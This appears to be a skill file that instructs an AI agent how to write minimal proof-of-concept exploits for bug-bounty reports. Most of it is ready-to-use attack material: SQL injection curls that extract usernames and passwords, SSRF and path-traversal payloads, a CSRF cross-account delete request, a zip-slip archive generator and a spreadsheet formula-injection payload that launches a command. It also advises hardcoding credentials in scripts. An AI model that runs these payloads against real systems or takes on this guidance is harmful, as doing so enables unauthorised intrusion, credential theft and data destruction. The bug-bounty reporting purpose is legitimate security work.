---
name: poc_simplicity
description: Karpathy-derived discipline for PoC scripts and exploit code — minimum viable demonstration, no overengineering, no speculative abstractions
depends_on: []
---

# PoC Simplicity

When generating proof-of-concept scripts and exploit code, prefer the smallest possible demonstration that proves the bug. Bug-bounty triagers read PoCs in 30 seconds — a 200-line Python framework loses to a 10-line curl. This skill encodes Karpathy's "Simplicity First" + "Surgical Changes" principles, scoped to PoC writing only (not recon, not exploration).

## When to Use

- Writing the `poc_script_code` field of `create_vulnerability_report`
- Generating shell/Python helpers for `terminal_execute` to demonstrate a confirmed bug
- Producing reproduction steps for a finding that is already validated
- DO NOT use during recon, fuzzing, or surface enumeration — those need breadth

## Core Rules

### 1. Prefer the smaller tool

Pick the lowest-power tool that demonstrates the bug:

| Bug class | Smallest viable tool | Avoid |
|-----------|---------------------|-------|
| Reflected XSS | `curl` + `grep` showing payload reflection | Python + BeautifulSoup parser |
| Stored XSS | 2 curls (POST payload, GET to read it back) | Selenium full browser session |
| SQLi | `curl` with `' OR 1=1--` and a UNION SELECT | sqlmap full automation script |
| IDOR | 2 curls (one as user A, one as user B, diff outputs) | Multi-role test framework |
| SSRF | 1 curl with `?url=http://169.254.169.254/...` and OOB callback proof | Python urllib3 reachability sweep |
| Path traversal | 1 curl with `?file=../../etc/passwd` | Custom file-discovery tool |
| Race condition | xargs -P + curl one-liner OR Turbo-Intruder XML | Asyncio framework with worker pools |
| Auth bypass | 1 request showing pre-bypass + 1 showing post-bypass | Auth-flow simulation harness |

### 2. No speculative features

A PoC has ONE job: prove the bug exists. It is NOT:

- A reusable testing tool
- A configurable exploit framework
- A defensive utility for the target's team
- A demonstration of every possible variant
- An automation pipeline

Strip everything that does not serve "show this bug works on this target right now".

### 3. No defensive scaffolding

Bug-bounty PoCs are not production code. Skip:

- Argparse / click CLIs (the PoC runs once)
- Try/except for impossible scenarios (network failure, json decode error on a known JSON endpoint)
- Logging / progress bars
- Configuration files / env-var loading
- Type hints / docstrings beyond a one-line header
- Test cases for the PoC itself

A 5-line script with a hardcoded URL is the right shape. Do not "improve" it.

### 4. Hardcode target-specific values for the PoC

This is the ONE place where target-specific hardcoding is correct. The PoC is for THIS bug on THIS target. Hardcode:

- The exact URL/endpoint
- The exact payload that worked
- The exact auth header that the target accepts
- The exact response substring that proves the bug

A PoC that is "configurable for any target" is not a PoC — it is an exploit kit, which is out of scope.

### 5. Show the response, not the request

Triagers want to see the bug's effect, not the attack mechanics. Always include:

- The request (one line)
- The response excerpt that PROVES the bug (the leaked password, the SSRF callback hit, the unauthorized data)

A PoC without proof of impact is useless. A PoC with both is decisive.

## The 30-Second Test

Write the PoC. Then ask: "Could a human triager copy-paste this and see the bug in 30 seconds?" If no, simplify until yes.

## Anti-Patterns

- **Python script >= 50 lines for a bug curl could prove in 5**. Rewrite as curl unless the bug genuinely requires multi-step state.
- **Generic functions named like `exploit_target(url, payload)`**. PoCs are not functions. Inline the values.
- **Reading from `.env` or `secrets.json`**. Hardcode the credentials in the script — the report is the secret bundle.
- **Multiple variant tests in one PoC**. File one report per variant; each PoC proves exactly one finding.
- **Comments explaining what the code does**. The code is 5 lines. It does not need comments. Use the report description for explanation.

## When NOT to Apply This

- During recon, exploitation hunting, or surface mapping — those phases benefit from broad tooling, not minimum tooling.
- When the bug genuinely requires multi-step state (OAuth token dance, race window setup, multi-stage upload). Then write only what's needed for that state, but no more.
- When the target uses non-HTTP protocols (gRPC, WebSocket) where curl alone insufficient.

The principle: **simplicity in service of proof, not simplicity for its own sake.** If the bug needs 100 lines, write 100. If it needs 5, do not write 50.

---

## Corpus-Derived PoC Patterns

Techniques from high-bounty reports that demonstrate how the simplest PoCs win the highest payouts.

### Regression-Corpus Testing as a PoC Strategy

Maintain a corpus of historical PoCs for any project you regularly audit:

1. After each new release or patch, replay every PoC in the corpus against the updated target.
2. Regressions are common during refactors — a fix that held for 6 months may break after a dependency update.
3. The PoC for a regression is trivially simple: it is the original PoC, unchanged. The report writes itself: "Bug X was fixed in version Y, regression introduced in version Z."

### Minimal SQLi Triplet

On any path parameter that looks like a UUID, integer ID, or slug:

```bash
# 1. Confirm injection (true condition)
curl -s 'https://target.com/api/item/1%27%20AND%20%271%27=%271'
# 2. Confirm injection (false condition - different response)
curl -s 'https://target.com/api/item/1%27%20AND%20%271%27=%272'
# 3. Extract data
curl -s 'https://target.com/api/item/1%27%20UNION%20SELECT%20username,password%20FROM%20users--'
```

Three curls. True condition, false condition, data extraction. The diff between responses 1 and 2 proves injection. Response 3 proves impact.

### CSRF Token Cross-User Validation

```bash
# 1. Get CSRF token from Account A
TOKEN_A=$(curl -s -c cookies_a.txt 'https://target.com/settings' | grep csrf | cut -d'"' -f4)
# 2. Use Account A's token in Account B's session
curl -s -b cookies_b.txt -X POST 'https://target.com/settings/delete' \
  -d "csrf_token=$TOKEN_A&confirm=1"
# Expected: 200 (action performed) = CSRF token not bound to session
```

Two curls prove the token is not session-bound. The response to step 2 proves the attack works.

### Role-State-Change Parity Test

When a user's permissions are modified:

```bash
# 1. As admin, get resource (should work)
curl -s -H 'Authorization: Bearer ADMIN_TOKEN' 'https://target.com/api/resource/123'
# 2. Revoke admin role via UI/API
# 3. Same request with same token (should fail, test if it still works)
curl -s -H 'Authorization: Bearer ADMIN_TOKEN' 'https://target.com/api/resource/123'
# Expected: 403. Actual: 200 with full data = revocation not enforced
```

The PoC is the same request twice with a permission change between them. The response diff proves the bug.

### Archive Import Traversal (Canonical PoC)

```python
import zipfile
z = zipfile.ZipFile('evil.zip', 'w')
z.writestr('../../../tmp/proof.txt', 'TRAVERSAL_PROOF')
z.close()
```

```bash
curl -s -X POST 'https://target.com/api/import' -F 'file=@evil.zip' -H 'Authorization: Bearer TOKEN'
curl -s 'https://target.com/tmp/proof.txt'
```

Five lines of Python to create the archive. Two curls to upload and verify. Every archive-import feature should be tested with this.

### Cookie SameSite Bypass via Platform Intent

When a security check depends on navigation initiator or site lineage:

1. Identify the OS-level mechanism that can initiate a navigation without the browser's SameSite enforcement (Android intents, iOS universal links, custom URL schemes).
2. The PoC is a minimal HTML page with an intent or redirect that triggers the target action.
3. Show: (a) direct browser navigation is blocked by SameSite, (b) intent-initiated navigation bypasses it.

### CSV Export Injection

```bash
# Inject formula into any field that appears in CSV/Excel export
curl -s -X POST 'https://target.com/api/profile' \
  -H 'Authorization: Bearer TOKEN' \
  -d '{"name": "=cmd|'\'' /C calc'\''!A0"}'
# Then trigger the export
curl -s 'https://target.com/api/export/users.csv' -H 'Authorization: Bearer ADMIN_TOKEN' -o export.csv
# Open export.csv in Excel -> formula executes
```

The PoC creates the payload, triggers the export, and the result file demonstrates the injection. No framework needed.
